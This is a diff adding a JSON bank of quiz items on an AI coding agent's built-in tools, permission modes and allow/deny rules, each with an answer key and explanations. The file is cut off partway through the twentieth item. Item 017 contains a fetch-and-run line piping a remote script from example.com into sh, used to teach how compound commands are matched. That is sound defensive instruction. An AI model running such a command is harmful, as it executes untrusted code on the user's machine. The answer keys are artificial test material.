@@ -1,0 +1,2021 @@
+[
+  {
+    "id": "CSK-PRM-001",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "single",
+    "select": 1,
+    "stem": "An SDK agent needs to find every line in a repository that matches the regex `TODO\\(\\w+\\)`. Which built-in tool is designed for searching inside file contents?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "`Grep`",
+        "why": "Grep searches file contents with ripgrep regex syntax and can return matching lines, file paths or counts."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`Glob`",
+        "why": "Glob matches file names and paths against a pattern such as `**/*.ts`; it does not look inside files."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`Read`",
+        "why": "Read returns the contents of one file you already know the path of; it does not search across the repository."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`WebSearch`",
+        "why": "WebSearch queries a web search backend for pages on the internet, not files on disk."
+      }
+    ],
+    "explanation": "Glob finds files by name, Grep finds lines inside files. Grep is built on ripgrep, so it uses ripgrep regex syntax (escape metacharacters such as `{` and `(`), skips gitignored files, and has `files_with_matches` (the default), `content` and `count` output modes.",
+    "reference": "Claude Code docs: Tools reference (Grep tool behavior)",
+    "source": "interview:builtin-tools-list",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://institute.sfeir.com/en/claude-code/claude-code-resources/interview/",
+        "https://code.claude.com/docs/en/tools-reference",
+        "https://code.claude.com/docs/en/agent-sdk/overview"
+      ]
+    },
+    "roleLevel": 1
+  },
+  {
+    "id": "CSK-PRM-002",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "match",
+    "select": 1,
+    "stem": "Match each task an agent needs to perform with the built-in tool that does it.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`Bash`",
+        "why": "Executes shell commands in the session's environment."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`WebFetch`",
+        "why": "Fetches a URL and extracts content from it with a prompt."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`Glob`",
+        "why": "Finds files by name pattern, such as `src/**/*.ts`."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`Edit`",
+        "why": "Makes an exact string replacement inside an existing file."
+      }
+    ],
+    "prompts": [
+      {
+        "id": "P1",
+        "text": "Run `npm test` and read the exit code",
+        "answer": "A"
+      },
+      {
+        "id": "P2",
+        "text": "Read the changelog page at a documentation URL",
+        "answer": "B"
+      },
+      {
+        "id": "P3",
+        "text": "List every `.ts` file under `src/`",
+        "answer": "C"
+      },
+      {
+        "id": "P4",
+        "text": "Rename one function call inside `app.py` without rewriting the whole file",
+        "answer": "D"
+      }
+    ],
+    "explanation": "`Bash` runs commands, `WebFetch` fetches and processes a web page, `Glob` lists files that match a name pattern, and `Edit` replaces an exact `old_string` with a `new_string` in a file. These names are the exact strings used in permission rules, `allowedTools`/`disallowedTools` and hook matchers.",
+    "reference": "Claude Code docs: Tools reference",
+    "source": "interview:builtin-tools-list",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://institute.sfeir.com/en/claude-code/claude-code-resources/interview/",
+        "https://code.claude.com/docs/en/tools-reference",
+        "https://code.claude.com/docs/en/agent-sdk/overview"
+      ]
+    },
+    "roleLevel": 1
+  },
+  {
+    "id": "CSK-PRM-003",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "single",
+    "select": 1,
+    "stem": "You want Claude to create and edit files in the working directory, and run `mkdir` or `mv` there, without approval each time, while other shell commands still need approval. Which permission mode fits?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`dontAsk`",
+        "why": "dontAsk turns every prompt into a denial; it would block the edits unless you pre-approved them with allow rules."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`plan`",
+        "why": "Plan mode is for exploring and proposing changes; file edits are never auto-approved there."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "`acceptEdits`",
+        "why": "acceptEdits auto-approves file edits and common filesystem commands such as `mkdir`, `touch`, `rm`, `mv` and `cp` for paths inside the working directories."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`bypassPermissions`",
+        "why": "bypassPermissions approves every tool, including arbitrary shell commands, which is far broader than asked."
+      }
+    ],
+    "explanation": "`acceptEdits` approves Edit/Write calls and filesystem commands (`mkdir`, `touch`, `rm`, `rmdir`, `mv`, `cp`, `sed`) only for paths inside the working directory or additional directories. Other Bash commands still go through the normal flow, and writes to protected paths or outside that scope are not auto-approved.",
+    "reference": "Agent SDK docs: Configure permissions (Accept edits mode)",
+    "source": "interview:permission-modes",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://www.interviewcoder.co/blog/claude-code-interview-questions",
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/",
+        "https://code.claude.com/docs/en/permission-modes",
+        "https://code.claude.com/docs/en/agent-sdk/permissions"
+      ]
+    },
+    "roleLevel": 1
+  },
+  {
+    "id": "CSK-PRM-004",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "truefalse",
+    "select": 1,
+    "stem": "Writing \"Never read the `.env` file\" in `CLAUDE.md` blocks Claude Code from reading `.env` in the same way a `Read(./.env)` deny rule does.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "True",
+        "why": "CLAUDE.md shapes what Claude tries to do, but Claude Code does not enforce it as a permission."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "False",
+        "why": "Correct: permission rules are enforced by Claude Code, while instructions in CLAUDE.md or a prompt are only guidance to the model."
+      }
+    ],
+    "explanation": "The permissions docs state that rules are enforced by Claude Code, not by the model. Instructions in a prompt or CLAUDE.md influence behaviour but do not change what Claude Code allows. To actually block access use a deny rule, a permission mode, a `PreToolUse` hook or, for subprocesses, the sandbox.",
+    "reference": "Claude Code docs: Configure permissions (Manage permissions)",
+    "roleLevel": 1
+  },
+  {
+    "id": "CSK-PRM-005",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "fill",
+    "select": 1,
+    "stem": "Which permission mode lets Claude read the codebase and propose a plan, but never auto-approves file edits? Type the mode's config value.",
+    "options": [],
+    "accepted": [
+      "plan",
+      "`plan`",
+      "Plan"
+    ],
+    "explanation": "In `plan` mode Claude explores and writes a plan without editing your source. In the Agent SDK, file edits (and, on recent Claude Code versions, shell commands that modify files) are never auto-approved in plan mode, even when an allow rule or a `PreToolUse` hook says allow; they go to your `canUseTool` callback.",
+    "reference": "Agent SDK docs: Configure permissions (Plan mode)",
+    "roleLevel": 1
+  },
+  {
+    "id": "CSK-PRM-006",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "single",
+    "select": 1,
+    "stem": "A project must stop Claude Code's file tools from reading the `.env` file at the project root. Which configuration does that?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "Add `.env` to a `.claudeignore` file in the project root so every tool skips it",
+        "why": "Claude Code does not read `.claudeignore`; the docs say it has no effect and its entries belong in Read deny rules."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "Add `Edit(./.env)` to `permissions.deny`",
+        "why": "An Edit deny rule blocks writes to the file, not reads, so Claude could still read the secrets."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Add `Read(./.env)` with a leading `!` to `permissions.allow` so the file is excluded",
+        "why": "A `!` pattern only carves exceptions out of earlier deny or ask rules; it does not create a block on its own."
+      },
+      {
+        "id": "D",
+        "correct": true,
+        "text": "Add `Read(./.env)` to `permissions.deny` in `.claude/settings.json`",
+        "why": "A Read deny rule blocks the built-in file tools from reading that path, and also blocks Edit and Write on it."
+      }
+    ],
+    "explanation": "To keep file tools away from secrets, add Read deny rules such as `Read(./.env)` or `Read(./secrets/**)`. A Read deny also stops Edit and Write on the same path. It covers built-in tools and Bash commands Claude Code recognises as reading a file (`cat`, `head`, ...), but not a script that opens the file itself; use the sandbox for OS-level enforcement.",
+    "reference": "Claude Code docs: Configure permissions (Read and Edit)",
+    "source": "interview:protect-secrets-deny-rules",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/",
+        "https://easyinterview.me/blogs/the-interview-questions-that-matter/claude-code-interview-guide",
+        "https://code.claude.com/docs/en/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/secure-deployment"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-007",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "single",
+    "select": 1,
+    "stem": "Claude calls the `Edit` tool with an `old_string` that appears three times in the file and does not set `replace_all`. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "The first occurrence is replaced and the other two are left exactly as they were",
+        "why": "Edit does not guess; an ambiguous match is not applied to the first occurrence."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "All three occurrences are replaced, because Edit treats `old_string` as a pattern",
+        "why": "Edit is exact string replacement with no regex or fuzzy matching, and it only replaces every occurrence when `replace_all: true` is set."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "The edit fails until `old_string` is unique or `replace_all: true` is set",
+        "why": "Uniqueness is one of the checks an edit has to pass, so the call fails until the match is unambiguous or replace_all is requested."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Claude Code asks the user which occurrence to change",
+        "why": "There is no interactive disambiguation; the tool returns an error and Claude retries with better input."
+      }
+    ],
+    "explanation": "Edit performs exact string replacement. Its checks are: the file is not covered by a Read deny rule, it has been read (with exceptions on newer models), `old_string` matches exactly, and `old_string` appears exactly once unless `replace_all: true` is set.",
+    "reference": "Claude Code docs: Tools reference (Edit tool behavior)",
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-008",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 1,
+    "type": "order",
+    "select": 1,
+    "stem": "Claude has to answer a question from a web page it does not have the URL for. Put the steps in the order they happen with the built-in web tools.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`WebSearch` returns result titles and URLs for a query",
+        "why": ""
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`WebFetch` requests one of the result URLs",
+        "why": ""
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "The fetched HTML is converted to Markdown",
+        "why": ""
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "An extraction prompt runs on the content in a separate model call, and Claude receives that result",
+        "why": ""
+      }
+    ],
+    "answerOrder": [
+      "A",
+      "B",
+      "C",
+      "D"
+    ],
+    "explanation": "WebSearch returns titles and URLs and does not fetch the pages. To read a page Claude follows up with WebFetch, which fetches the URL, converts HTML to Markdown and, for most fetches, runs the extraction prompt in a separate model call. Claude sees that call's output rather than the raw page, which makes WebFetch lossy by design.",
+    "reference": "Claude Code docs: Tools reference (WebSearch and WebFetch)",
+    "roleLevel": 1
+  },
+  {
+    "id": "CSK-PRM-009",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "single",
+    "select": 1,
+    "stem": "An allow rule reads `Bash(npm run *)`. Which set of commands does it match?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "`npm run build`, `npm run test --watch` and a bare `npm run`, but not `npm install`",
+        "why": "Everything before the `*` must match as written, and a trailing ` *` also covers the command with nothing after it."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`npm run build` and `npm run test --watch`, but not a bare `npm run`",
+        "why": "A trailing ` *` that is the only wildcard also matches the bare command, so `npm run` matches too."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Any command that begins with `npm`, including `npm install`, `npm ci` and `npm publish`",
+        "why": "The text before the wildcard is `npm run `, so `npm install` does not match."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "Only commands with exactly one word after `run`, such as `npm run build`",
+        "why": "In Bash rules `*` matches any text, including spaces, so extra arguments are covered."
+      }
+    ],
+    "explanation": "Bash rules match the whole command text. `*` matches any text including spaces, the words before the first `*` are what limit the rule, and a trailing ` *` that is the only wildcard also matches the bare command. So `Bash(npm run *)` matches `npm run`, `npm run build` and `npm run test --watch`, but not `npm install`.",
+    "reference": "Claude Code docs: Configure permissions (Wildcard patterns)",
+    "source": "interview:permission-rule-syntax",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/python",
+        "https://easyinterview.me/blogs/the-interview-questions-that-matter/claude-code-interview-guide"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-010",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "multi",
+    "select": 2,
+    "stem": "Which statements about these Bash permission rules are correct? (Choose two.)",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "`Bash(ls *)` matches a bare `ls` as well as `ls -la`",
+        "why": "A trailing ` *` that is the rule's only wildcard also matches the command with nothing after it."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "`Bash(ls*)` matches `lsof`",
+        "why": "With no space before the `*`, any command starting with the letters `ls` matches, including `lsof`."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`Bash(ls *)` matches `lsof`",
+        "why": "The space before the trailing `*` is part of the rule, so `lsof` does not match."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`Bash(ls:*)` matches `lsof`",
+        "why": "The `:*` suffix is an equivalent spelling of a trailing ` *`, so it behaves like `Bash(ls *)`."
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "`Bash(* --help *)` matches `npm --help`",
+        "why": "The bare-command exception applies only when the trailing `*` is the only wildcard; this rule has two."
+      }
+    ],
+    "explanation": "Three rules explain Bash wildcard matching: `*` stands in for any text, a trailing ` *` that is the only wildcard also matches the bare command, and the space before a trailing `*` is significant. `:*` at the end of a pattern is the same as ` *`.",
+    "reference": "Claude Code docs: Configure permissions (Wildcard patterns)",
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-011",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "single",
+    "select": 1,
+    "stem": "An SDK app runs with `permissionMode: 'bypassPermissions'`, `allowDangerouslySkipPermissions: true` and `disallowedTools: ['Bash(rm *)']`. Claude runs `rm -rf build/`. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "It runs, because bypassPermissions approves every tool call",
+        "why": "Deny rules are checked before the permission mode, so bypass never sees a call a deny rule has blocked."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "It goes to the `canUseTool` callback for a decision",
+        "why": "A matching deny rule blocks the call outright; it does not fall through to the callback."
+      },
+      {
+        "id": "C",
+        "correct": true,
+        "text": "It is blocked, because deny rules apply in every mode, including bypassPermissions",
+        "why": "Scoped deny rules are evaluated at step 2 of the flow, before the mode step where bypass approves calls."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "The Bash tool is removed from Claude's context entirely, so Claude cannot even attempt the call",
+        "why": "Only a bare-name deny such as `Bash` removes the tool; a scoped rule leaves Bash available and blocks matching calls."
+      }
+    ],
+    "explanation": "The SDK checks hooks, then deny rules, then ask rules, then the permission mode. A matching deny rule blocks the call even in `bypassPermissions`. Note the limit: Bash rules match the command text, so `/bin/rm -rf build/` or `bash -c 'rm ...'` is not matched by `Bash(rm *)` and would fall through to the mode.",
+    "reference": "Agent SDK docs: Configure permissions (Allow and deny rules)",
+    "source": "interview:deny-rules-vs-bypass",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/permissions",
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-012",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "truefalse",
+    "select": 1,
+    "stem": "Settings contain the deny rule `Bash(aws *)` and the allow rule `Bash(aws s3 ls)`. Claude can run `aws s3 ls` without approval because the more specific allow rule wins.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "True",
+        "why": "Rule specificity does not change the order; a broader deny still matches the call."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "False",
+        "why": "Correct: rules are evaluated deny, then ask, then allow, and the first match wins, so the deny rule blocks `aws s3 ls`."
+      }
+    ],
+    "explanation": "Claude Code evaluates permission rules in the order deny, ask, allow, and rule specificity does not change that order. An allow rule cannot carve an exception out of a deny rule, and a matching ask rule prompts even when a narrower allow rule also matches.",
+    "reference": "Claude Code docs: Configure permissions (Manage permissions)",
+    "source": "interview:deny-rules-vs-bypass",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/permissions",
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-013",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "single",
+    "select": 1,
+    "stem": "A scheduled job runs the SDK with `permissionMode: 'dontAsk'`, `allowedTools: ['Read', 'Bash(npm test)']` and a `canUseTool` callback. Claude tries to run `npm install lodash`. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "The call is denied without calling `canUseTool`",
+        "why": "dontAsk converts anything that would prompt into a denial and skips the callback step entirely."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`canUseTool` is called, and the call is denied only if it returns deny",
+        "why": "In dontAsk mode the final canUseTool step is skipped; the callback is never consulted."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "It runs, because dontAsk only denies tools that need user interaction",
+        "why": "dontAsk denies every call that would otherwise prompt, not only interactive tools."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "The query fails with a configuration error because dontAsk cannot be combined with `canUseTool`",
+        "why": "The combination is allowed; the callback simply is not called in this mode."
+      }
+    ],
+    "explanation": "`dontAsk` runs calls approved by allow rules or hooks and calls that need no approval (such as file reads inside the working directories), and denies everything else without calling `canUseTool`. That fail-closed behaviour is why it suits headless jobs with a fixed tool surface.",
+    "reference": "Agent SDK docs: Configure permissions (Don't ask mode)",
+    "source": "interview:dontask-mode",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/permission-modes",
+        "https://code.claude.com/docs/en/headless"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-014",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "single",
+    "select": 1,
+    "stem": "A Python SDK agent working in `/srv/app` also needs to read and edit files in `/srv/shared-lib`. Which option grants that, and what else does it load from the added directory?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`cwd=['/srv/app', '/srv/shared-lib']`; both directories become full project roots with their own CLAUDE.md and settings",
+        "why": "`cwd` takes a single directory; it is not a list of roots."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`allowed_tools=['Read(//srv/shared-lib/**)']`; it loads nothing else from the directory",
+        "why": "An allow rule pre-approves reads but does not add a working directory, so edits there are still outside the scope acceptEdits covers."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`add_dirs=['/srv/shared-lib']`; it loads the directory's `.claude/settings.json` hooks and permission rules too",
+        "why": "Settings from an added directory contribute only `enabledPlugins` and `extraKnownMarketplaces`; hooks and permission rules are not loaded."
+      },
+      {
+        "id": "D",
+        "correct": true,
+        "text": "`add_dirs=['/srv/shared-lib']`; it also loads that directory's skills, commands and subagents",
+        "why": "The SDK passes each entry as `--add-dir`, and flag-added directories load skills, commands and subagents, but not their CLAUDE.md by default."
+      }
+    ],
+    "explanation": "Python's `add_dirs` (TypeScript `additionalDirectories`) is passed to Claude Code as `--add-dir`. Files there follow the same rules as the working directory. Skills, commands and subagents in the added directory load through the `project` setting source; its CLAUDE.md loads only when `CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD=1` is set.",
+    "reference": "Claude Code docs: Configure permissions (Additional directories grant file access, not configuration)",
+    "source": "interview:add-dirs",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/agent-sdk/python",
+        "https://code.claude.com/docs/en/cli-reference"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-015",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "fill",
+    "select": 1,
+    "stem": "In the TypeScript Agent SDK, `permissionMode: 'bypassPermissions'` requires one more option set to `true` as a deliberate safety acknowledgement. Type that option's name.",
+    "options": [],
+    "accepted": [
+      "allowDangerouslySkipPermissions",
+      "allowDangerouslySkipPermissions: true"
+    ],
+    "explanation": "The TypeScript `Options` type documents `allowDangerouslySkipPermissions` as required when using `permissionMode: 'bypassPermissions'`. Even then, deny rules, ask rules and hooks still apply, and bypass is only defensible in an isolated container or VM.",
+    "reference": "Agent SDK docs: TypeScript reference (Options)",
+    "source": "interview:bypass-permissions-sdk",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://code.claude.com/docs/en/agent-sdk/typescript",
+        "https://easyinterview.me/blogs/the-interview-questions-that-matter/claude-code-interview-guide",
+        "https://eseospace.com/blog/claude-code-developer-interview-questions/"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-016",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "single",
+    "select": 1,
+    "stem": "Your TypeScript `canUseTool` callback should let a Bash call run, but rewrite `/tmp` to `/tmp/sandbox` in the command first. Which return value does that?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`{ behavior: 'allow', updatedPermissions: [{ type: 'addRules', ... }] }`",
+        "why": "updatedPermissions persists permission rules for later calls; it does not change this call's input."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "`{ behavior: 'allow', updatedInput: { ...input, command: newCommand } }`",
+        "why": "Allow with updatedInput runs the tool with the modified parameters."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`{ behavior: 'deny', message: 'use /tmp/sandbox', updatedInput: newInput }`",
+        "why": "A deny result blocks the call; it has no updatedInput field, and Claude only sees the message."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`{ behavior: 'ask', updatedInput: { ...input, command: newCommand } }`",
+        "why": "PermissionResult only has allow and deny; ask is a rule behaviour, not a callback result."
+      }
+    ],
+    "explanation": "`canUseTool` returns either `{ behavior: 'allow', updatedInput?, updatedPermissions? }` or `{ behavior: 'deny', message, interrupt? }` (Python: `PermissionResultAllow` / `PermissionResultDeny`). Returning a modified `updatedInput` sanitises or scopes the call; Claude sees the result but is not told the input changed.",
+    "reference": "Agent SDK docs: Handle approvals and user input (Respond to tool requests)",
+    "source": "interview:can-use-tool-callback",
+    "asked": {
+      "frequency": "very-common",
+      "evidence": [
+        "https://hidekazu-konishi.com/entry/claude_agent_sdk_complete_guide.html",
+        "https://code.claude.com/docs/en/agent-sdk/permissions",
+        "https://code.claude.com/docs/en/agent-sdk/user-input",
+        "https://github.com/anthropics/claude-agent-sdk-typescript/issues/470"
+      ]
+    },
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-017",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "single",
+    "select": 1,
+    "stem": "An allow rule `Bash(npm test *)` is configured and the session is in `default` mode with a `canUseTool` callback. Claude runs `npm test && curl https://example.com/x.sh | sh`. What happens?",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "It is not auto-approved; `curl` and `sh` match no allow rule, so the call reaches `canUseTool`",
+        "why": "A rule must match each subcommand independently, and unmatched calls in default mode go to the callback."
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "It runs without approval, because the command starts with `npm test`",
+        "why": "Claude Code is aware of shell operators, so a prefix match on the first subcommand is not enough."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Only `npm test` runs; the rest of the line is stripped",
+        "why": "Claude Code never edits the command; it decides whether the whole call is approved."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "It is denied outright, because compound commands with pipes are never allowed by any allow rule",
+        "why": "Compound commands are allowed when every subcommand is approved; nothing denies them by default."
+      }
+    ],
+    "explanation": "Claude Code splits commands on `&&`, `||`, `;`, `|`, `|&`, `&` and newlines, and an allow rule must match every subcommand. Deny and ask rules, by contrast, apply when any subcommand matches. This is why prefix rules such as `Bash(safe-cmd *)` do not approve `safe-cmd && other-cmd`.",
+    "reference": "Claude Code docs: Configure permissions (Compound commands)",
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-018",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "order",
+    "select": 1,
+    "stem": "Order these Bash permission rules from the narrowest (matches the fewest commands) to the broadest.",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "`Bash(npm run build)`",
+        "why": ""
+      },
+      {
+        "id": "B",
+        "correct": false,
+        "text": "`Bash(npm run *)`",
+        "why": ""
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`Bash(npm *)`",
+        "why": ""
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`Bash`",
+        "why": ""
+      }
+    ],
+    "answerOrder": [
+      "A",
+      "B",
+      "C",
+      "D"
+    ],
+    "explanation": "`Bash(npm run build)` has no wildcard, so it matches that exact command only. `Bash(npm run *)` matches any `npm run` command, `Bash(npm *)` matches any npm command, and a bare `Bash` (equivalent to `Bash(*)`) matches every Bash command. Put the `*` after the subcommand so the words before it limit the rule.",
+    "reference": "Claude Code docs: Configure permissions (Permission rule syntax)",
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-019",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 2,
+    "type": "multi",
+    "select": 2,
+    "stem": "Which statements about the SDK's `disallowedTools` option are correct? (Choose two.)",
+    "options": [
+      {
+        "id": "A",
+        "correct": true,
+        "text": "`disallowedTools: ['Bash']` removes the Bash tool definition from the request, so Claude cannot see or attempt it",
+        "why": "A bare-name deny removes the tool from Claude's context before evaluation begins."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "`disallowedTools: ['Bash(rm *)']` keeps Bash available and denies matching calls, even in `bypassPermissions` mode",
+        "why": "Scoped deny rules are checked at the deny step, which runs before the permission mode."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "`disallowedTools: ['*']` is ignored, just as `allowedTools: ['*']` is",
+        "why": "Tool-name globs are supported in deny rules: `*` removes every tool definition. Only unanchored allow globs are ignored."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "`disallowedTools: ['Bash(rm *)']` also blocks `/bin/rm -rf build/`",
+        "why": "Bash rules match the command text as written; an absolute path to the binary is not matched."
+      },
+      {
+        "id": "E",
+        "correct": false,
+        "text": "`disallowedTools` only applies in `default` mode; other modes skip deny rules",
+        "why": "Deny rules apply in every permission mode."
+      }
+    ],
+    "explanation": "Deny rules come in two forms. A bare name (or a glob such as `*` or `mcp__*`) removes matching tools from the request. A scoped rule such as `Bash(rm *)` keeps the tool and blocks matching calls in every mode. Bash rules are text matches, so pair them with the sandbox when the restriction must hold.",
+    "reference": "Agent SDK docs: Configure permissions (Allow and deny rules)",
+    "roleLevel": 2
+  },
+  {
+    "id": "CSK-PRM-020",
+    "domain": 1,
+    "skill": "tools-and-permissions",
+    "difficulty": 3,
+    "type": "single",
+    "select": 1,
+    "stem": "For compliance, a team logs every `Write` call from its `canUseTool` callback. After switching the agent to `permissionMode: 'acceptEdits'`, no `Write` calls appear in the log, although files are being written. What is the cause and the fix?",
+    "options": [
+      {
+        "id": "A",
+        "correct": false,
+        "text": "acceptEdits routes file tools through `PostToolUse` instead of `canUseTool`; move the logging into a PostToolUse hook that reads `tool_input`",
+        "why": "Modes do not reroute tools to other hooks; the call is simply approved before the callback step."
+      },
+      {
+        "id": "B",
+        "correct": true,
+        "text": "acceptEdits approves file edits at the permission-mode step, before `canUseTool`; move the audit into a `PreToolUse` hook",
+        "why": "Auto-approved calls never reach canUseTool, while hooks run first for every call."
+      },
+      {
+        "id": "C",
+        "correct": false,
+        "text": "Write calls are reported to the callback under the name `Edit` in acceptEdits; match on `Edit` too",
+        "why": "Tool names are not renamed by the mode; the callback is not called at all for those writes."
+      },
+      {
+        "id": "D",
+        "correct": false,
+        "text": "The callback only fires in streaming input mode; switch the prompt to an async iterable",
+        "why": "The input mode is not the issue; the same writes reached the callback in default mode."
+      }
+    ],
+    "explanation": "Any approval earlier in the flow (an allow rule, `acceptEdits`, `bypassPermissions`) resolves the call before `canUseTool`, so checks placed there are silently skipped. For logic that must see every tool call, use a `PreToolUse` hook, which runs before the rest of the evaluation.",
+    "reference": "Agent SDK docs: Configure permissions (How permissions are evaluated)",
+    "source": "interview:can-use-tool-bypassed",
+    "asked": {
+      "frequency": "common",
+      "evidence": [
+        "https://github.com/anthropics/claude-agent-sdk-typescript/issues/493",
